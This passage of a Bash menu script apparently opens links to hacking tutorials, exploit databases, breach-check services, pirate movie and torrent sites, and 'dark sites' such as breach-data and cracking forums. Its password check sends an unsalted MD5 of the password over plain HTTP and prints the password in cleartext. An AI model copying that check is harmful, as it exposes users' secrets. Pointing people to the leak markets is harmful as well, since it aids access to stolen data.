    elif [[ ${pages_fake_emails} == "00" ]] || [[ ${pages_fake_emails} == "0" ]];then
    pages_menu
    else
    clear
    banner
    error_404
    sleep 1
    pages_fake_emails
    fi
}

pages_hacking_learning(){
    clear
    banner
    echo -e "${bluebold}[* SELECT HACKING LEARNING *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] W3Resource.com"${reset}
    echo -e "${bluebold}[${reset}02${bluebold}] SecurityTube.net${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] Creadpag.com${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] HackThisSite.org${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] NullByte.com${reset}"
    echo -e "${bluebold}[${reset}06${bluebold}] OverTheWire.org${reset}"
    echo -e "${bluebold}[${reset}07${bluebold}] DerechoDeLaRed.com${reset}"
    echo -e "${bluebold}[${reset}08${bluebold}] PentestLab.blog${reset}"
    echo -e "${bluebold}[${reset}09${bluebold}] Hydrasky.com${reset}"
    echo -e "${bluebold}[${reset}10${bluebold}] Ethacklesias.com${reset}"
    echo -e "${bluebold}[${reset}11${bluebold}] Nitratine.net${reset}"
    echo -e "${bluebold}[${reset}12${bluebold}] GbHackers.com${reset}"
    echo -e "${bluebold}[${reset}13${bluebold}] HackerRoadMap.git${reset}"
    echo -e "${bluebold}[${reset}14${bluebold}] FacundoSalgado.com${reset}"
    echo -e "${bluebold}[${reset}15${bluebold}] CodeWars.com${reset}"
    echo -e "${bluebold}[${reset}16${bluebold}] HackingTutorial.com${reset}"
    echo -e "${bluebold}[${reset}17${bluebold}] W3Schools.com${reset}"
    echo -e "${bluebold}[${reset}18${bluebold}] StackOverflow.com${reset}"
    echo -e "${bluebold}[${reset}19${bluebold}] Amanhardikar.com${reset}"
    echo -e "${bluebold}[${reset}20${bluebold}] Pwnable.tw${reset}"
    echo -e "${bluebold}[${reset}21${bluebold}] HackingArticles.in${reset}"
    echo -e "${bluebold}[${reset}22${bluebold}] GitHub.com${reset}"
    echo -e "${bluebold}[${reset}23${bluebold}] HackMag.com${reset}"
    echo -e "${bluebold}[${reset}24${bluebold}] HackADay.com${reset}"
    echo -e "${bluebold}[${reset}25${bluebold}] Bhf.com.ar${reset}"
    echo -e "${bluebold}[${reset}26${bluebold}] 0x00sec.org${reset}"
    echo -e "${bluebold}[${reset}27${bluebold}] Exploit.in${reset}"
    echo -e "${bluebold}[${reset}28${bluebold}] BlogUnderC0de.org${reset}"
    echo -e "${bluebold}[${reset}29${bluebold}] BlogElHacker.net${reset}"
    echo -e "${bluebold}[${reset}30${bluebold}] HackBySecurity.com${reset}"
    echo -e "${bluebold}[${reset}31${bluebold}] EsGeeks.com${reset}"
    echo -e "${bluebold}[${reset}32${bluebold}] ElLadoDelMal.com${reset}"
    echo -e "${bluebold}[${reset}33${bluebold}] JaymonSecurity.com${reset}"
    echo -e "${bluebold}[${reset}34${bluebold}] Disoftin.com${reset}"
    echo -e "${bluebold}[${reset}35${bluebold}] HackXCrack.net${reset}"
    echo -e "${bluebold}[${reset}36${bluebold}] SecnHack.in${reset}"
    echo -e "${bluebold}[${reset}37${bluebold}] DarkNet.org.uk${reset}"
    echo -e "${bluebold}[${reset}38${bluebold}] CyberPunk.rs${reset}"
    echo -e "${bluebold}[${reset}39${bluebold}] KitPloit.com${reset}"
    echo -e "${bluebold}[${reset}40${bluebold}] Hacknos.com${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_hacking_learning

    if [[ ${pages_hacking_learning} == "01" ]] || [[ ${pages_hacking_learning} == "1" ]];then
    xdg-open https://www.w3resource.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "02" ]] || [[ ${pages_hacking_learning} == "2" ]];then
    xdg-open http://www.securitytube.net > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "03" ]] || [[ ${pages_hacking_learning} == "3" ]];then
    xdg-open https://www.creadpag.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "04" ]] || [[ ${pages_hacking_learning} == "4" ]];then
    xdg-open https://www.hackthissite.org > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "05" ]] || [[ ${pages_hacking_learning} == "5" ]];then
    xdg-open https://null-byte.wonderhowto.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "06" ]] || [[ ${pages_hacking_learning} == "6" ]];then
    xdg-open https://overthewire.org/ > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "07" ]] || [[ ${pages_hacking_learning} == "7" ]];then
    xdg-open https://derechodelared.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "08" ]] || [[ ${pages_hacking_learning} == "8" ]];then
    xdg-open https://pentestlab.blog > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "09" ]] || [[ ${pages_hacking_learning} == "9" ]];then
    xdg-open https://hydrasky.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "10" ]] || [[ ${pages_hacking_learning} == "10" ]];then
    xdg-open https://ethacklesias.wordpress.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "11" ]] || [[ ${pages_hacking_learning} == "11" ]];then
    xdg-open https://nitratine.net > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "12" ]] || [[ ${pages_hacking_learning} == "12" ]];then
    xdg-open https://gbhackers.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "13" ]] || [[ ${pages_hacking_learning} == "13" ]];then
    xdg-open https://github.com/sundowndev/hacker-roadmap > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "14" ]] || [[ ${pages_hacking_learning} == "14" ]];then
    xdg-open https://www.facundosalgado.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "15" ]] || [[ ${pages_hacking_learning} == "15" ]];then
    xdg-open https://www.codewars.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "16" ]] || [[ ${pages_hacking_learning} == "16" ]];then
    xdg-open https://www.hacking-tutorial.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "17" ]] || [[ ${pages_hacking_learning} == "17" ]];then
    xdg-open https://www.w3schools.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "18" ]] || [[ ${pages_hacking_learning} == "18" ]];then
    xdg-open https://stackoverflow.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "19" ]] || [[ ${pages_hacking_learning} == "19" ]];then
    xdg-open https://amanhardikar.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "20" ]] || [[ ${pages_hacking_learning} == "20" ]];then
    xdg-open https://pwnable.tw > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "21" ]] || [[ ${pages_hacking_learning} == "21" ]];then
    xdg-open https://www.hackingarticles.in > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "22" ]] || [[ ${pages_hacking_learning} == "22" ]];then
    xdg-open https://www.github.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "23" ]] || [[ ${pages_hacking_learning} == "23" ]];then
    xdg-open https://hackmag.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "24" ]] || [[ ${pages_hacking_learning} == "24" ]];then
    xdg-open https://hackaday.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "25" ]] || [[ ${pages_hacking_learning} == "25" ]];then
    xdg-open https://bhf.com.ar > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "26" ]] || [[ ${pages_hacking_learning} == "26" ]];then
    xdg-open https://0x00sec.org > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "27" ]] || [[ ${pages_hacking_learning} == "27" ]];then
    xdg-open https://exploit.in > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "28" ]] || [[ ${pages_hacking_learning} == "28" ]];then
    xdg-open https://blog.underc0de.org > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "29" ]] || [[ ${pages_hacking_learning} == "29" ]];then
    xdg-open https://blog.elhacker.net > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "30" ]] || [[ ${pages_hacking_learning} == "30" ]];then
    xdg-open https://www.hackbysecurity.com/blog > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "31" ]] || [[ ${pages_hacking_learning} == "31" ]];then
    xdg-open https://esgeeks.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "32" ]] || [[ ${pages_hacking_learning} == "32" ]];then
    xdg-open https://www.elladodelmal.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "33" ]] || [[ ${pages_hacking_learning} == "33" ]];then
    xdg-open https://jaymonsecurity.com/blog/ > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "34" ]] || [[ ${pages_hacking_learning} == "34" ]];then
    xdg-open https://www.disoftin.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "35" ]] || [[ ${pages_hacking_learning} == "35" ]];then
    xdg-open https://hackxcrack.net/foro/index.php > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "36" ]] || [[ ${pages_hacking_learning} == "36" ]];then
    xdg-open https://secnhack.in > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "37" ]] || [[ ${pages_hacking_learning} == "37" ]];then
    xdg-open https://www.darknet.org.uk > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "38" ]] || [[ ${pages_hacking_learning} == "38" ]];then
    xdg-open https://www.cyberpunk.rs > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "39" ]] || [[ ${pages_hacking_learning} == "39" ]];then
    xdg-open https://www.kitploit.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "40" ]] || [[ ${pages_hacking_learning} == "40" ]];then
    xdg-open https://www.hacknos.com > /dev/null 2>&1
    pages_hacking_learning
    elif [[ ${pages_hacking_learning} == "00" ]] || [[ ${pages_hacking_learning} == "0" ]];then
    pages_menu
    else
    clear
    banner
    error_404
    sleep 1
    pages_hacking_learning
    fi
}

pages_data_bases(){
    clear
    banner
    echo -e "${bluebold}[* SELECT DATABASE *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] VulnerabilityLab.com"${reset}
    echo -e "${bluebold}[${reset}02${bluebold}] En0Day.Today${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] CveMitre.org${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] Exploitdb.com${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] WindowsExploits.git${reset}"
    echo -e "${bluebold}[${reset}06${bluebold}] 0DayHome.net${reset}"
    echo -e "${bluebold}[${reset}07${bluebold}] ZeroDay.cz${reset}"
    echo -e "${bluebold}[${reset}08${bluebold}] Vuldb.com${reset}"
    echo -e "${bluebold}[${reset}09${bluebold}] Cisa.gov${reset}"
    echo -e "${bluebold}[${reset}10${bluebold}] HackPuntes.com${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_data_bases

    if [[ ${pages_data_bases} == "01" ]] || [[ ${pages_data_bases} == "1" ]];then
    xdg-open https://www.vulnerability-lab.com > /dev/null 2>&1
    pages_data_bases
    elif [[ ${pages_data_bases} == "02" ]] || [[ ${pages_data_bases} == "2" ]];then
    xdg-open https://en.0day.today > /dev/null 2>&1
    pages_data_bases
    elif [[ ${pages_data_bases} == "03" ]] || [[ ${pages_data_bases} == "3" ]];then
    xdg-open https://cve.mitre.org/index.html > /dev/null 2>&1
    pages_data_bases
    elif [[ ${pages_data_bases} == "04" ]] || [[ ${pages_data_bases} == "4" ]];then
    xdg-open https://www.exploit-db.com > /dev/null 2>&1
    pages_data_bases
    elif [[ ${pages_data_bases} == "05" ]] || [[ ${pages_data_bases} == "5" ]];then
    xdg-open https://github.com/abatchy17/WindowsExploits > /dev/null 2>&1
    pages_data_bases
    elif [[ ${pages_data_bases} == "06" ]] || [[ ${pages_data_bases} == "6" ]];then
    xdg-open https://www.0dayhome.net > /dev/null 2>&1
    pages_data_bases
    elif [[ ${pages_data_bases} == "07" ]] || [[ ${pages_data_bases} == "7" ]];then
    xdg-open https://www.zero-day.cz/database/ > /dev/null 2>&1
    pages_data_bases
    elif [[ ${pages_data_bases} == "08" ]] || [[ ${pages_data_bases} == "8" ]];then
    xdg-open https://vuldb.com > /dev/null 2>&1
    pages_data_bases
    elif [[ ${pages_data_bases} == "09" ]] || [[ ${pages_data_bases} == "9" ]];then
    xdg-open https://www.cisa.gov/known-exploited-vulnerabilities-catalog > /dev/null 2>&1
    pages_data_bases
    elif [[ ${pages_data_bases} == "10" ]] || [[ ${pages_data_bases} == "10" ]];then
    xdg-open https://hackpuntes.com/category/exploits/ > /dev/null 2>&1
    pages_data_bases
    elif [[ ${pages_data_bases} == "00" ]] || [[ ${pages_data_bases} == "0" ]];then
    pages_menu
    else
    clear
    banner
    error_404
    sleep 1
    pages_data_bases
    fi
}

pages_check_pwned(){
    clear
    banner
    echo -e "${bluebold}[* SELECT PWNED CHECK *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Email & Phone (HaveIBeenPwned?)${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Password (HaveIBeenPwned?)${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] Email (Avast)${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] Email Checker (EmailChecker)${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] Password (Nitrxgen DB)${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_check_pwned

    if [[ ${pages_check_pwned} == "01" ]] || [[ ${pages_check_pwned} == "1" ]];then
    xdg-open https://haveibeenpwned.com > /dev/null 2>&1
    pages_check_pwned
    elif [[ ${pages_check_pwned} == "02" ]] || [[ ${pages_check_pwned} == "2" ]];then
    xdg-open https://haveibeenpwned.com/Passwords > /dev/null 2>&1
    pages_check_pwned
    elif [[ ${pages_check_pwned} == "03" ]] || [[ ${pages_check_pwned} == "3" ]];then
    xdg-open https://www.avast.com/hackcheck/ > /dev/null 2>&1
    pages_check_pwned
    elif [[ ${pages_check_pwned} == "04" ]] || [[ ${pages_check_pwned} == "4" ]];then
    xdg-open https://email-checker.net/validate > /dev/null 2>&1
    pages_check_pwned
    elif [[ ${pages_check_pwned} == "05" ]] || [[ ${pages_check_pwned} == "5" ]];then
    pages_check_pwned_nitrxgen
    elif [[ ${pages_check_pwned} == "00" ]] || [[ ${pages_check_pwned} == "0" ]];then
    pages_menu
    else
    clear
    banner
    error_404
    sleep 1
    pages_check_pwned
    fi
}

pages_check_pwned_nitrxgen(){
    clear
    banner
    echo -e "${bluebold}[* PWNED CHECK *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter Password (To Check Nitrxgen DataBase)${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_check_pwned_nitrxgen
    if [[ -z ${pages_check_pwned_nitrxgen} ]];then
    error_404
    sleep 1
    pages_check_pwned_nitrxgen
    fi
    MD5CP=$(echo -n "${pages_check_pwned_nitrxgen}" | md5sum | grep -o "[0-9a-z]\+")
    sleep 1

    clear
    banner
    echo -e "${bluebold}[* PWNED CHECK *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Checking Password...${reset}"
    echo -e ""
    PASSCHECKNITRX=$(curl -s http://www.nitrxgen.net/md5db/${MD5CP} | xargs)
    if [[ ${PASSCHECKNITRX} == "" ]] || [[ ${PASSCHECKNITRX} == "null" ]] || [[ ${PASSCHECKNITRX} == " " ]];then
    PASSCHECKNITRX="${greenbold}[${reset}*${greenbold}] Your Password ${pages_check_pwned_nitrxgen} Not Found In DataBase Is Secure ${Y}"
    else
    PASSCHECKNITRX="${redbold}[${reset}*${redbold}] Your Password ${pages_check_pwned_nitrxgen} Found In DataBase Is Insecure ${N}"
    fi
    sleep 5
    pages_check_pwned_nitrxgen_results
}

pages_check_pwned_nitrxgen_results(){
    clear
    banner
    echo -e "${bluebold}[* PWNED CHECK *]${reset}"
    echo -e ""
    echo -e "${PASSCHECKNITRX}"
    echo -e ""
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_check_pwned_nitrxgen_results

    if [[ ${pages_check_pwned_nitrxgen_results} == "00" ]] || [[ ${pages_check_pwned_nitrxgen_results} == "0" ]];then
    pages_check_pwned
    else
    clear
    banner
    error_404
    sleep 1
    pages_check_pwned_nitrxgen_results
    fi
}

pages_darks_sites(){
    clear
    banner
    echo -e "${bluebold}[* SELECT DARK SITE *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] ForoGore.net"${reset}
    echo -e "${bluebold}[${reset}02${bluebold}] GoreForum.net${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] BlackHatWorld.com${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] RaidForums.com${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] AnonFiles.com${reset}"
    echo -e "${bluebold}[${reset}06${bluebold}] HackForums.net${reset}"
    echo -e "${bluebold}[${reset}07${bluebold}] EvilZone.org${reset}"
    echo -e "${bluebold}[${reset}08${bluebold}] Cracked.io${reset}"
    echo -e "${bluebold}[${reset}09${bluebold}] CrackingAll.com${reset}"
    echo -e "${bluebold}[${reset}10${bluebold}] Eleaks.to${reset}"
    echo -e "${bluebold}[${reset}11${bluebold}] Cracking.org${reset}"
    echo -e "${bluebold}[${reset}12${bluebold}] LeakedSource.ru${reset}"
    echo -e "${bluebold}[${reset}13${bluebold}] BestBlackHatForum.com${reset}"
    echo -e "${bluebold}[${reset}14${bluebold}] Pastebin.com${reset}"
    echo -e "${bluebold}[${reset}15${bluebold}] Scavenger.git${reset}"
    echo -e "${bluebold}[${reset}16${bluebold}] Deeponionweb.com${reset}"
    echo -e "${bluebold}[${reset}17${bluebold}] Darknet.org.uk${reset}"
    echo -e "${bluebold}[${reset}18${bluebold}] Dark.fail${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_darks_sites

    if [[ ${pages_darks_sites} == "01" ]] || [[ ${pages_darks_sites} == "1" ]];then
    xdg-open https://forogore.net > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "02" ]] || [[ ${pages_darks_sites} == "2" ]];then
    xdg-open https://goreforum.net > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "03" ]] || [[ ${pages_darks_sites} == "3" ]];then
    xdg-open https://www.blackhatworld.com > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "04" ]] || [[ ${pages_darks_sites} == "4" ]];then
    xdg-open  https://raidforums.com > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "05" ]] || [[ ${pages_darks_sites} == "5" ]];then
    xdg-open  https://anonfiles.com > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "06" ]] || [[ ${pages_darks_sites} == "6" ]];then
    xdg-open  https://hackforums.net > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "07" ]] || [[ ${pages_darks_sites} == "7" ]];then
    xdg-open  https://evilzone.org > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "08" ]] || [[ ${pages_darks_sites} == "8" ]];then
    xdg-open  https://cracked.io/Forum-Español > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "09" ]] || [[ ${pages_darks_sites} == "9" ]];then
    xdg-open  https://crackingall.com > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "10" ]] || [[ ${pages_darks_sites} == "10" ]];then
    xdg-open https://eleaks.to > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "11" ]] || [[ ${pages_darks_sites} == "11" ]];then
    xdg-open https://cracking.org > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "12" ]] || [[ ${pages_darks_sites} == "12" ]];then
    xdg-open https://leakedsource.ru/main/ > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "13" ]] || [[ ${pages_darks_sites} == "13" ]];then
    xdg-open http://bestblackhatforum.com > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "14" ]] || [[ ${pages_darks_sites} == "14" ]];then
    xdg-open https://pastebin.com > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "15" ]] || [[ ${pages_darks_sites} == "15" ]];then
    xdg-open https://github.com/rndinfosecguy/Scavenger > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "16" ]] || [[ ${pages_darks_sites} == "16" ]];then
    xdg-open https://www.deeponionweb.com > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "17" ]] || [[ ${pages_darks_sites} == "17" ]];then
    xdg-open https://www.darknet.org.uk > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "18" ]] || [[ ${pages_darks_sites} == "18" ]];then
    xdg-open https://dark.fail > /dev/null 2>&1
    pages_darks_sites
    elif [[ ${pages_darks_sites} == "00" ]] || [[ ${pages_darks_sites} == "0" ]];then
    pages_menu
    else
    clear
    banner
    error_404
    sleep 1
    pages_darks_sites
    fi
}

pages_movies(){
    clear
    banner
    echo -e "${bluebold}[* SELECT MOVIE SITE *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Cuevana3.io${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Cuevana3.plus${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] Gnula.nu${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] Movidy.club${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] Movidy.tv${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_movies

    if [[ ${pages_movies} == "01" ]] || [[ ${pages_movies} == "1" ]];then
    xdg-open https://cuevana3.io > /dev/null 2>&1
    pages_movies
    elif [[ ${pages_movies} == "02" ]] || [[ ${pages_movies} == "2" ]];then
    xdg-open https://cuevana3.plus > /dev/null 2>&1
    pages_movies
    elif [[ ${pages_movies} == "03" ]] || [[ ${pages_movies} == "3" ]];then
    xdg-open https://gnula.nu > /dev/null 2>&1
    pages_movies
    elif [[ ${pages_movies} == "04" ]] || [[ ${pages_movies} == "4" ]];then
    xdg-open https://movidy.club > /dev/null 2>&1
    pages_movies
    elif [[ ${pages_movies} == "05" ]] || [[ ${pages_movies} == "5" ]];then
    xdg-open https://movidy.tv > /dev/null 2>&1
    pages_movies
    elif [[ ${pages_movies} == "00" ]] || [[ ${pages_movies} == "0" ]];then
    pages_menu
    else
    clear
    banner
    error_404
    sleep 1
    pages_movies
    fi
}

pages_yt_hacking(){
    clear
    banner
    echo -e "${bluebold}[* SELECT YT HACKING *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] aaronga97${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Android Infosec${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Android Summit${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Antonio Sarosi${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Armadel-Nova${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] awanvenom${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] BorjaGalisteo${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Ciberseguridad Para Todos - David Pereira${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Codecourse${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Computerphile${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Contando Bits${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] David Bombal${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Derek Banas${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Developer Charl Alem${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] EDteam${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Fireship${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] fossfrog${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] freeCodeCamp.org${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Gabriel Coding${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Geek's Lesson${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Geekzmo${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] GioCode${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Guia Anônima${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] HackerSploit${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] HackWise${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Hak5${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Hiroki${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Ivam3byCinderella${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] JEP Entertainment${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Kalle Hallden${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Karla's Project${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] LinuxScoop${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] LiveOverflow${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Loi Liang Yang${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Lopez lopi${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Master Tutos 93${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] MattKC${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] NetworkChuck${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Nico Knows Tech${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] No Solo Hacking${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Null Byte${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Pentesting School${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Pienso, luego existo${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] PORTAL-IT ID${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Roger Biderbost${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] S4viOnLive${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] s4vitar${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] sanivle${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] shiey${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Siam Alam${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Solo Python${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] SSTec Tutorials${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] STÖK${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] TechChip${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Tecnología con Berto${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] The Cherno${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] YottaHack${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] zSecurity${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_yt_hacking

    if [[ ${pages_yt_hacking} == "00" ]] || [[ ${pages_yt_hacking} == "0" ]];then
    pages_menu
    else
    clear
    banner
    error_404
    sleep 1
    pages_yt_hacking
    fi
}

pages_torrents_files(){
    clear
    banner
    echo -e "${bluebold}[* SELECT PAGE *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] 1337x.to${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] 1337x.st${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] thepiratebay.org${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] nyaa.si${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] katcr.to${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_torrents_files

